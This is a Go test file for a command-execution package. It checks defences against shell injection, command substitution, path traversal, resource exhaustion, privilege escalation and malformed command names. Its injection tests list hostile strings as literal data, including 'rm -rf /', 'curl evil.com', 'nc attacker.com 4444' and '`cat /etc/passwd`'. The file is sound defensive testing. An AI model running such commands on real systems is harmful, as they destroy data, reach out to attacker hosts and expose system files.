package execute

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
)

// TestCommandInjectionPrevention tests prevention of command injection attacks
func TestCommandInjectionPrevention(t *testing.T) {
	ctx := context.Background()

	t.Run("shell_mode_disabled_by_default", func(t *testing.T) {
		// Test that shell mode is disabled by default for security
		opts := Options{
			Command: "echo",
			Args:    []string{"test"},
			Shell:   true, // Explicitly enabling shell mode
		}

		// Shell mode should be discouraged and logged as dangerous
		_, err := Run(ctx, opts)

		// The function might succeed but should log warnings
		// In a production system, we might want to block shell mode entirely
		if err == nil {
			t.Log("Shell mode executed - this should generate security warnings")
		}
	})

	t.Run("injection_in_command_args", func(t *testing.T) {
		// Test various injection attempts through command arguments
		injectionArgs := [][]string{
			{";", "rm", "-rf", "/"},
			{"&&", "curl", "evil.com"},
			{"|", "whoami"},
			{"$(curl evil.com)"},
			{"`whoami`"},
			{"arg1", ";", "malicious_command"},
			{"normal_arg", "&&", "rm", "-rf", "/"},
			{"arg", "|", "nc", "attacker.com", "4444"},
		}

		for _, args := range injectionArgs {
			opts := Options{
				Command: "echo",
				Args:    args,
				Shell:   false, // Shell disabled - should be safe
			}

			// Commands should execute safely without shell interpretation
			output, err := Run(ctx, opts)

			// Even if command succeeds, output should not indicate command execution
			if err == nil {
				// Output should contain the arguments as literal text, not executed
				if strings.Contains(output, "root") || strings.Contains(output, "uid=") {
					t.Errorf("Command injection may have occurred. Output: %s", output)
				}
			}
		}
	})

	t.Run("command_substitution_prevention", func(t *testing.T) {
		// Test that command substitution is prevented
		substitutionAttempts := []string{
			"$(whoami)",
			"`id`",
			"${HOME}",
			"$USER",
			"$(curl evil.com)",
			"`cat /etc/passwd`",
		}

		for _, attempt := range substitutionAttempts {
			opts := Options{
				Command: "echo",
				Args:    []string{attempt},
				Shell:   false,
				Capture: true, // Enable capture to get output
			}

			output, err := Run(ctx, opts)

			if err == nil {
				// Output should contain the literal string, not the result of substitution
				if !strings.Contains(output, attempt) {
					t.Errorf("Command substitution may have occurred for: %s, output: %s", attempt, output)
				}

				// Should not contain typical command output
				suspiciousOutputs := []string{"uid=", "gid=", "root", "/bin/", "/usr/"}
				for _, suspicious := range suspiciousOutputs {
					if strings.Contains(output, suspicious) {
						t.Errorf("Suspicious output suggests command substitution: %s", output)
					}
				}
			}
		}
	})

	t.Run("path_traversal_in_commands", func(t *testing.T) {
		// Test prevention of path traversal in command execution
		pathTraversalAttempts := []string{
			"../../../bin/sh",
			"./../../usr/bin/curl",
			"/bin/../bin/sh",
			"\\..\\..\\windows\\system32\\cmd.exe",
		}

		for _, attempt := range pathTraversalAttempts {
			opts := Options{
				Command: attempt,
				Args:    []string{"-c", "whoami"},
				Shell:   false,
			}

			// These should fail to execute or execute safely without traversal
			output, err := Run(ctx, opts)

			if err == nil {
				// If command succeeds, it should not show signs of shell access
				if strings.Contains(output, "root") || strings.Contains(output, "uid=") {
					t.Errorf("Path traversal may have succeeded for: %s", attempt)
				}
			}
		}
	})
}

// TestResourceExhaustionPrevention tests prevention of resource exhaustion attacks
func TestResourceExhaustionPrevention(t *testing.T) {
	ctx := context.Background()

	t.Run("timeout_enforcement", func(t *testing.T) {
		// Test that timeouts are enforced to prevent indefinite execution
		opts := Options{
			Command: "sleep",
			Args:    []string{"10"},  // 10 seconds
			Timeout: 1 * time.Second, // 1 second timeout
		}

		start := time.Now()
		_, err := Run(ctx, opts)
		elapsed := time.Since(start)

		// Should timeout and not run for the full 10 seconds
		if elapsed > 3*time.Second {
			t.Errorf("Command did not timeout as expected. Elapsed: %v", elapsed)
		}

		// Should return timeout error
		if err == nil {
			t.Error("Expected timeout error, got nil")
		}
	})

	t.Run("retry_limit_enforcement", func(t *testing.T) {
		// Test that retry limits prevent infinite retry loops
		opts := Options{
			Command: "false", // Command that always fails
			Args:    []string{},
			Retries: 2, // Limited retries
		}

		start := time.Now()
		_, err := Run(ctx, opts)
		elapsed := time.Since(start)

		// Should fail after limited retries, not run indefinitely
		if elapsed > 5*time.Second {
			t.Errorf("Command retries took too long. Elapsed: %v", elapsed)
		}

		// Should return error after retries exhausted
		testutil.AssertError(t, err)
	})

	t.Run("concurrent_execution_limits", func(t *testing.T) {
		// Test that concurrent command execution is handled safely
		const numConcurrent = 10
		results := make(chan error, numConcurrent)

		// Launch multiple concurrent commands
		for i := 0; i < numConcurrent; i++ {
			go func() {
				opts := Options{
					Command: "echo",
					Args:    []string{"test"},
					Timeout: 5 * time.Second,
				}
				_, err := Run(ctx, opts)
				results <- err
			}()
		}

		// Collect results
		successCount := 0
		for i := 0; i < numConcurrent; i++ {
			err := <-results
			if err == nil {
				successCount++
			}
		}

		// Most commands should succeed (system should handle concurrent load)
		if successCount < numConcurrent/2 {
			t.Errorf("Too many concurrent commands failed: %d/%d succeeded", successCount, numConcurrent)
		}
	})
}

// TestPrivilegeEscalationPrevention tests prevention of privilege escalation
func TestPrivilegeEscalationPrevention(t *testing.T) {
	ctx := context.Background()

	t.Run("sudo_command_handling", func(t *testing.T) {
		// Test handling of sudo commands
		opts := Options{
			Command: "sudo",
			Args:    []string{"whoami"},
			Shell:   false,
		}

		// This should either fail or execute without elevated privileges
		output, err := Run(ctx, opts)

		if err == nil {
			// If sudo succeeds, it should not return "root" unless legitimately elevated
			if strings.Contains(output, "root") {
				// This might be legitimate if running as root, so just log
				t.Logf("Sudo command returned 'root': %s", output)
			}
		}
	})

	t.Run("setuid_binary_execution", func(t *testing.T) {
		// Test execution of potentially dangerous setuid binaries
		potentiallyDangerousBinaries := []string{
			"su",
			"passwd",
			"ping", // Often setuid
		}

		for _, binary := range potentiallyDangerousBinaries {
			opts := Options{
				Command: binary,
				Args:    []string{"--help"}, // Safe argument
				Timeout: 2 * time.Second,
			}

			// These should execute safely or fail gracefully
			_, err := Run(ctx, opts)

			// We mainly want to ensure no panics or security issues
			if err != nil {
				t.Logf("Binary %s failed (expected): %v", binary, err)
			}
		}
	})

	t.Run("environment_variable_injection", func(t *testing.T) {
		// Test that environment variables cannot be used for privilege escalation
		originalPath := os.Getenv("PATH")
		defer func() { _ = os.Setenv("PATH", originalPath) }() // Test cleanup, error not critical

		// Set malicious PATH
		_ = os.Setenv("PATH", "/tmp:/malicious/path:"+originalPath) // Test setup, error not critical

		opts := Options{
			Command: "echo",
			Args:    []string{"test"},
		}

		// Command should still execute safely despite malicious PATH
		output, err := Run(ctx, opts)

		if err != nil {
			t.Logf("Command failed with modified PATH (this might be expected): %v", err)
		} else {
			// Should produce expected output
			if !strings.Contains(output, "test") {
				t.Errorf("Unexpected output with modified PATH: %s", output)
			}
		}
	})
}

// TestCommandValidation tests validation of command input
func TestCommandValidation(t *testing.T) {
	ctx := context.Background()

	t.Run("empty_command_rejection", func(t *testing.T) {
		// Test that empty commands are rejected
		opts := Options{
			Command: "",
			Args:    []string{"arg1"},
		}

		_, err := Run(ctx, opts)
		testutil.AssertError(t, err)
	})

	t.Run("whitespace_only_command_rejection", func(t *testing.T) {
		// Test that whitespace-only commands are rejected
		whitespaceCommands := []string{
			" ",
			"\t",
			"\n",
			"   ",
			"\t\n ",
		}

		for _, cmd := range whitespaceCommands {
			opts := Options{
				Command: cmd,
				Args:    []string{"arg1"},
			}

			_, err := Run(ctx, opts)
			testutil.AssertError(t, err)
		}
	})

	t.Run("null_byte_in_command", func(t *testing.T) {
		// Test that null bytes in commands are handled safely
		opts := Options{
			Command: "echo\x00malicious",
			Args:    []string{"test"},
		}

		// Should either fail or sanitize the null byte
		output, err := Run(ctx, opts)

		if err == nil {
			// Output should not contain null bytes
			for i, b := range []byte(output) {
				if b == 0 {
					t.Errorf("Output contains null byte at position %d", i)
				}
			}
		}
	})

	t.Run("unicode_normalization_in_commands", func(t *testing.T) {
		// Test handling of Unicode characters in commands
		unicodeCommands := []string{
			"еcho",       // Cyrillic е instead of e
			"ech\u200Bo", // Zero-width space
			"echo\uFF1B", // Fullwidth semicolon
		}

		for _, cmd := range unicodeCommands {
			opts := Options{
				Command: cmd,
				Args:    []string{"test"},
			}

			// These should fail to execute (command not found)
			_, err := Run(ctx, opts)
			if err == nil {
				t.Errorf("Unicode command variation should not execute: %s", cmd)
			}
		}
	})
}

// TestSecureCommandExecution tests overall secure command execution
func TestSecureCommandExecution(t *testing.T) {
	ctx := context.Background()

	t.Run("safe_command_execution", func(t *testing.T) {
		// Test that legitimate commands execute safely
		safeCommands := []struct {
			command string
			args    []string
		}{
			{"echo", []string{"hello", "world"}},
			{"ls", []string{"-la", "/tmp"}},
			{"cat", []string{"/dev/null"}},
			{"true", []string{}},
			{"false", []string{}},
		}

		for _, safe := range safeCommands {
			opts := Options{
				Command: safe.command,
				Args:    safe.args,
				Timeout: 5 * time.Second,
			}

			// These should execute without security issues
			_, err := Run(ctx, opts)

			// Some commands might fail (e.g., if not available), but should not cause security issues
			if err != nil {
				t.Logf("Safe command %s failed (might be expected): %v", safe.command, err)
			}
		}
	})

	t.Run("command_output_sanitization", func(t *testing.T) {
		// Test that command output is properly sanitized
		opts := Options{
			Command: "echo",
			Args:    []string{"test\x00with\x01control\x02chars"},
		}

		output, err := Run(ctx, opts)

		if err == nil {
			// Output should not contain dangerous control characters
			dangerousChars := []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}
			for _, dangerous := range dangerousChars {
				if strings.Contains(output, string(dangerous)) {
					t.Errorf("Output contains dangerous control character: %d", dangerous)
				}
			}
		}
	})
}
